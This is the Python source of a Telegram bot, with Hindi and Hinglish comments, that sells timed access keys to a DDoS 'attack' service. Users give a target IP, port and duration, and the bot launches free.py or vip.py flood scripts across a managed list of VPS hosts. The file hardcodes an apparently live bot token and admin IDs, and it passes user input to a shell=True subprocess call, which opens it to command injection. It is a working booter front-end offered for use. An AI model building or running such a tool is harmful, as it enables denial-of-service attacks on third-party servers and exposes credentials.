#!/usr/bin/python3
import telebot
import time
import datetime
import subprocess
import threading
import random
import string
import pytz
import json
import os
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton  # ✅ FIXED IMPORT ERROR

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7053228704:AAF6whw5eBZ8bspvKNYgV1pqsVoYealO6qY')

# ✅ GROUP AND ADMIN DETAILS
GROUP_ID = "-1002369239894"
ADMINS = ["7129010361"]

SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"

# ✅ FILE PATHS
USER_FILE = "users.txt"
KEY_FILE = "keys.txt"
REDEEM_LOG_FILE = "redeem_log.json"

# ✅ Timezone सेट (IST)
IST = pytz.timezone('Asia/Kolkata')

# ✅ Redeem Log लोड/सेव फंक्शन
def load_redeem_log():
    try:
        with open(REDEEM_LOG_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_redeem_log(log):
    with open(REDEEM_LOG_FILE, "w") as file:
        json.dump(log, file)

redeem_log = load_redeem_log()

# ✅ Key और User डेटा लोड करने के फंक्शन
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        expiry = IST.localize(expiry)
                        keys[key] = expiry
                    except ValueError:
                        print(f"⚠ Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def read_users():
    users = set()
    try:
        with open(USER_FILE, "r") as file:
            users = set(file.read().splitlines())
    except FileNotFoundError:
        pass
    return users

allowed_users = read_users()
keys = read_keys()

# ✅ Expired Users को Remove करने का फंक्शन
def remove_expired_users():
    now = datetime.datetime.now(IST)
    expired_users = []

    for user_id, key in redeem_log.items():
        if key in keys and now > keys[key]:
            expired_users.append(user_id)

    for user_id in expired_users:
        if user_id in allowed_users:
            allowed_users.remove(user_id)
        del redeem_log[user_id]

    for key in list(keys.keys()):
        if now > keys[key]:
            del keys[key]

    save_redeem_log(redeem_log)
    write_keys(keys)

    with open(USER_FILE, "w") as file:
        file.writelines("\n".join(allowed_users))

# ✅ बॉट स्टार्ट होने पर Expired Users Remove करें
remove_expired_users()

# ✅ Key Generate, Validate, Remove
def generate_key(days=0, hours=0):
    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)  # ✅ Fix: expiry अब सही से बन रहा है
    keys[new_key] = expiry
    write_keys(keys)
    return new_key

def remove_key(key):
    if key in keys:
        del keys[key]
        write_keys(keys)

        # ✅ अब उस Key को यूज़ करने वाले यूज़र को भी हटाओ
        user_to_remove = None
        for user_id, user_key in redeem_log.items():
            if user_key == key:
                user_to_remove = user_id
                break

        if user_to_remove:
            redeem_log.pop(user_to_remove, None)  # ✅ User को redeem_log से हटाओ
            allowed_users.discard(user_to_remove)  # ✅ User को allowed_users से हटाओ

            # ✅ Users file अपडेट करो
            with open(USER_FILE, "w") as file:
                file.writelines("\n".join(allowed_users))

            save_redeem_log(redeem_log)  # ✅ Updated Log Save करो

        return True
    return False

def is_user_allowed(user_id):
    now = datetime.datetime.now(IST)
    if user_id in redeem_log:
        key = redeem_log[user_id]
        if key in keys and now > keys[key]:
            # ✅ अगर Key expire हो गई, तो यूजर को remove कर दो
            del keys[key]  # Expired Key हटाओ
            del redeem_log[user_id]  # Redeem Log से यूजर हटाओ
            allowed_users.discard(user_id)  # Allowed Users से हटाओ
            save_redeem_log(redeem_log)
            write_keys(keys)

            # ✅ Users file अपडेट करो
            with open(USER_FILE, "w") as file:
                file.writelines("\n".join(allowed_users))
            return False  # ❌ अब यह यूजर blocked हो गया
    return user_id in allowed_users

# ✅ /START Command (Welcome + Help Button)
@bot.message_handler(commands=['start'])
def start_command(message):
    user = message.from_user
    first_name = user.first_name if user.first_name else "User"

    # ✅ Inline Button for Help
    markup = InlineKeyboardMarkup()
    help_button = InlineKeyboardButton("ℹ HELP", callback_data="show_help")
    markup.add(help_button)

    welcome_text = f"👋 **WELCOME, {first_name}!**\nमैं तुम्हारी हेल्प के लिए यहाँ हूँ। नीचे दिए गए बटन पर क्लिक करो:"

    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# ✅ CALLBACK HANDLER FOR HELP BUTTON
@bot.callback_query_handler(func=lambda call: call.data == "show_help")
def help_callback(call):
    help_text = """
📌 **BOT COMMANDS LIST:**  

👤 **USER COMMANDS:**  
🔹 `/myinfo` - अपना स्टेटस और Key की Expiry चेक करो  
🔹 `/redeem <KEY>` - एक्सेस पाने के लिए Key रिडीम करो  
🔹 `/RS <IP> <PORT> <TIME>` - अटैक स्टार्ट करो  

👑 **ADMIN COMMANDS:**  
🔹 `/genkey <DAYS> [HOURS]` - नई Key बनाओ  
🔹 `/removekey <KEY>` - किसी Key को डिलीट करो  
🔹 `/stats` - एक्टिव अटैक्स को देखो  
🔹 `/check` - सभी एक्टिव Keys को देखो  
"""

    bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")

# ✅ /GENKEY Command (Admin Only)
# ✅ /GENKEY Command (Admin Only) - Now Generates Keys in "1H-RSVIP-XXXXXX" Format
@bot.message_handler(commands=['genkey'])
def generate_new_key(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return  # **✅ फिक्स: अगर एडमिन नहीं है तो रिटर्न करो**

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /genkey <DAYS> [HOURS]")
        return  # **✅ फिक्स: अगर कमांड सही फॉर्मेट में नहीं है तो रिटर्न करो**

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0  # ✅ अब घंटे भी ऐड हो सकते हैं
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    # ✅ अब की का फॉर्मेट सही बनाते हैं
    if days > 0 and hours == 0:
        prefix = f"{days}D-RSVIP"
    elif hours > 0 and days == 0:
        prefix = f"{hours}H-RSVIP"
    else:
        prefix = f"{days}D{hours}H-RSVIP"

    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))  # ✅ 6 Random Characters
    new_key = f"{prefix}-{random_part}"

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n?? `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

# ✅ /REMOVEKEY Command (Admin Only)
@bot.message_handler(commands=['removekey'])
def remove_existing_key(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /removekey <KEY>")
        return 

    if remove_key(command[1]):
        bot.reply_to(message, "✅ KEY REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, "❌ KEY NOT FOUND!")

# ✅ /MULTIUSERKEY Command (Admin Only)
@bot.message_handler(commands=['multiuserkey'])
def generate_multiuser_key(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /multiuserkey <DAYS> [HOURS]")
        return

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)

    # ✅ MULTI-USER KEY GENERATION
    new_key = f"MULTI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"✅ MULTI-USER KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

# ✅ Updated /REDEEM Command for Multi-User Key Support
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /redeem <KEY>")
        return

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name  
    key = command[1]

    # ✅ INVALID KEY CHECK
    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY! 🔑")  
        return

    expiry_date = keys[key]
    if datetime.datetime.now(IST) > expiry_date:
        del keys[key]
        write_keys(keys)
        bot.reply_to(message, f"⏳ THIS KEY HAS **EXPIRED!**\n📅 **Expired On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ✅ MULTI-USER KEY LOGIC
    if key.startswith("MULTI-"):
        allowed_users.add(user_id)
        redeem_log[user_id] = key
        save_redeem_log(redeem_log)

        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")

        bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ✅ NORMAL KEY LOGIC (SINGLE-USE)
    if user_id in redeem_log:
        bot.reply_to(message, f"❌ YOU HAVE ALREADY REDEEMED A KEY!\n🔑 **Your Key:** `{redeem_log[user_id]}`", parse_mode="Markdown")
        return

    if key in redeem_log.values():
        existing_user = [uid for uid, k in redeem_log.items() if k == key][0]
        bot.reply_to(message, f"❌ THIS KEY HAS ALREADY BEEN REDEEMED!\n👤 **User ID:** `{existing_user}`", parse_mode="Markdown")
        return

    allowed_users.add(user_id)
    redeem_log[user_id] = key
    save_redeem_log(redeem_log)

    with open(USER_FILE, "a") as file:
        file.write(f"{user_id}\n")

    bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")

# ✅ HANDLE ATTACK COMMAND
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KARO!** {SCREENSHOT_CHANNEL}")
        return

    if user_id in active_attacks:
        bot.reply_to(message, "⚠️ **EK TIME MAIN 2 HI ATTACK ALLOWED HAI!**\n👉 **PURANA KHATAM HONE DO! `/check` KARO!**")
        return

    if user_id in pending_verification:
        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **FREE USAGE:** `/attack <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > 100:
        bot.reply_to(message, "🚫 **100S SE ZYADA ALLOWED NAHI HAI!**")
        return

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = (target, port, end_time)

    bot.send_message(
        message.chat.id,
        f"🔥 **ATTACK DETAILS** 🔥\n\n"
        f"👤 **USER:** `{user_id}`\n"
        f"🎯 **TARGET:** `{target}`\n"
        f"📍 **PORT:** `{port}`\n"
        f"⏳ **DURATION:** `{time_duration} SECONDS`\n"
        f"🕒 **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"🚀 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        f"⚠️ **ATTACK CHALU HAI! `/check` KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # ✅ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"python3 free.py {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "✅ **ATTACK KHATAM HO GAYA!** 🎯\n"
                "📸 **AB TURANT SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI LAGEGA!**",
                parse_mode="Markdown"
            )
            pending_verification[user_id] = True  # ✅ अब यूजर को स्क्रीनशॉट भेजना पड़ेगा
            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर

    threading.Thread(target=attack_execution).start()

# ✅ SCREENSHOT VERIFICATION SYSTEM
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    if user_id not in pending_verification:
        bot.reply_to(message, "❌ **TERE KOI PENDING VERIFICATION NAHI HAI! SCREENSHOT FALTU NA BHEJ!**")
        return

    # ✅ SCREENSHOT CHANNEL FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")

    del pending_verification[user_id]  # ✅ अब यूजर अटैक कर सकता है
    bot.reply_to(message, "✅ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")

#  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
@bot.message_handler(commands=['bgmi'])
def handle_vip_attack(message):
    user_id = str(message.from_user.id)

    # ✅ सिर्फ ग्रुप में काम करेगा  
    if str(message.chat.id) != GROUP_ID:
        bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
        return

    # ✅ पहले चेक करें कि यूज़र ने Key रिडीम की है और VIP है या नहीं  
    if not is_user_allowed(user_id):
        bot.reply_to(message, "🖕 **PEHLE VIP KEY REDEEM KARO, TABHI ATTACK KAR SAKTE HO!**")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ **VIP USAGE:** /bgmi <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 **VIP USERS KE LIYE MAX ATTACK TIME 240 SECONDS HAI!**")
        return

    # ✅ Multivps.py को सही से रन करें  
    try:
        subprocess.Popen(["python3", "vip.py", target, str(port), str(time_duration)])
        bot.reply_to(message, f"🔥 **VIP Attack Started! /stats **\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")

        attack_end_time = time.time() + time_duration
        if user_id not in active_attacks:
            active_attacks[user_id] = []
        active_attacks[user_id].append((target, port, attack_end_time))

        def send_attack_finished():
            time.sleep(time_duration)
            bot.send_message(message.chat.id, f"✅ **VIP Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")

        threading.Thread(target=send_attack_finished, daemon=True).start()

    except Exception as e:
        bot.reply_to(message, f"❌ **VIP Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")


# ✅ `/stats` Command  
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    now = time.time()
    updated_attacks = {}

    # ✅ खत्म हो चुके अटैक्स हटाएँ  
    for user_id, attacks in active_attacks.items():
        active_attacks[user_id] = [attack for attack in attacks if attack[2] > now]
        if active_attacks[user_id]:  
            updated_attacks[user_id] = active_attacks[user_id]

    # ✅ अगर कोई एक्टिव अटैक नहीं बचा तो मैसेज भेजें  
    if not updated_attacks:
        bot.reply_to(message, "📊 **No Active Attacks Right Now!**")
        return

    # ✅ एक्टिव अटैक्स का Status तैयार करें  
    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
    for user_id, attacks in updated_attacks.items():
        stats_message += f"👤 **User ID:** `{user_id}`\n"
        for target, port, end_time in attacks:
            remaining_time = int(end_time - now)
            stats_message += f"🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Ends In:** `{remaining_time}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ /MYINFO Command (Shows User Details + Key Expiry)
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    user_id = str(user.id)
    username = user.username if user.username else "N/A"
    first_name = user.first_name if user.first_name else "N/A"
    last_name = user.last_name if user.last_name else "N/A"

    # ✅ अगर यूजर की Key एक्सपायर हो चुकी है
    if not is_user_allowed(user_id):
        bot.reply_to(message, "⏳ **PEHLE KEY BUY KR! PLEASE REDEEM A KEY.**")
        return  # ✅ FIX: यहाँ से फंक्शन को रोक देना चाहिए

    is_admin = "✅ YES" if user_id in ADMINS else "❌ NO"
    has_access = "✅ YES" if user_id in allowed_users else "❌ NO"

    # ✅ Key Details Check
    if user_id in redeem_log:
        user_key = redeem_log[user_id]
        expiry_date = keys.get(user_key, None)
        if expiry_date:
            expiry_text = expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')
        else:
            expiry_text = "❌ EXPIRED"
    else:
        user_key = "❌ NO KEY"
        expiry_text = "N/A"

    info_text = f"""
👤 **User Info:**
🆔 **User ID:** `{user_id}`
🔹 **Username:** `{username}`
👑 **Admin:** {is_admin}
🎟 **Access:** {has_access}

🔑 **Key Details:**
🔹 **Key:** `{user_key}`
📅 **Expiry:** `{expiry_text}`
"""
    bot.reply_to(message, info_text, parse_mode="Markdown")

# ✅ /ANNOUNCE Command (Admin Only)
@bot.message_handler(commands=['announce'])
def announce_message(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /announce <message>")
        return

    announcement = f"📢 **ANNOUNCEMENT:**\n{command[1]}"
    
    # ✅ Auto-Pin Announcement
    msg = bot.send_message(GROUP_ID, announcement, parse_mode="Markdown")
    bot.pin_chat_message(GROUP_ID, msg.message_id)

    # ✅ Auto-Delete After 2 Hours (7200 seconds)
    threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()

    bot.reply_to(message, "✅ ANNOUNCEMENT SENT & PINNED!")

# add vps
@bot.message_handler(commands=['addvps'])
def add_vps(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ USAGE: /addvps <IP> <USERNAME> <PASSWORD>")
        return

    ip, user, password = command[1], command[2], command[3]

    # VPS को free.py और vip.py में ऐड करें
    for filename in ["free.py", "vip.py"]:
        with open(filename, "r") as file:
            lines = file.readlines()

        # VPS लिस्ट खोजें और नया VPS जोड़ें
        for i, line in enumerate(lines):
            if "VPS_LIST = [" in line:
                lines.insert(i + 1, f'    {{"host": "{ip}", "user": "{user}", "password": "{password}"}},\n')
                break

        # फाइल को अपडेट करें
        with open(filename, "w") as file:
            file.writelines(lines)

    bot.reply_to(message, f"✅ NEW VPS ADDED!\n🌐 **IP:** `{ip}`\n👤 **User:** `{user}`", parse_mode="Markdown")

# /remove vps
@bot.message_handler(commands=['removevps'])
def remove_vps(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /removevps <IP>")
        return

    ip_to_remove = command[1]
    removed = False

    for filename in ["free.py", "vip.py"]:
        with open(filename, "r") as file:
            lines = file.readlines()

        new_lines = [line for line in lines if f'"host": "{ip_to_remove}"' not in line]

        if len(new_lines) < len(lines):
            with open(filename, "w") as file:
                file.writelines(new_lines)
            removed = True

    if removed:
        bot.reply_to(message, f"✅ VPS `{ip_to_remove}` REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, f"❌ VPS `{ip_to_remove}` NOT FOUND!")

# checkvps
@bot.message_handler(commands=['checkvps'])
def check_vps(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    vps_list = []

    for filename in ["free.py", "vip.py"]:
        with open(filename, "r") as file:
            lines = file.readlines()

        for line in lines:
            if '"host":' in line:
                vps_list.append(line.strip())

    if vps_list:
        vps_info = "\n".join(vps_list)
        bot.reply_to(message, f"🔍 **ACTIVE VPS LIST:**\n```\n{vps_info}\n```", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ NO VPS FOUND!")

# ✅ /CHECK Command (List Active Keys)
@bot.message_handler(commands=['check'])
def check_keys(message):
    if str(message.chat.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    # ✅ पहले Expired Keys Remove करो
    remove_expired_users()

    if not keys:
        bot.reply_to(message, "❌ NO ACTIVE KEYS!")
        return

    key_list = "🔑 **ACTIVE KEYS:**\n"
    for key, expiry in keys.items():
        key_list += f"🔹 `{key}` - 📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S IST')}\n"

    bot.reply_to(message, key_list, parse_mode="Markdown")

def auto_clean_expired_keys():
    while True:
        remove_expired_users()
        time.sleep(30)  # हर 30 sec में Expired Keys Remove करेगा

# ✅ Expired Keys Auto-Remove System स्टार्ट करो
threading.Thread(target=auto_clean_expired_keys, daemon=True).start()

# ✅ Bot Polling (MAIN LOOP)
while True:
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"Polling Error: {e}")
        time.sleep(5)  # कुछ सेकंड wait करके फिर से start करेगा
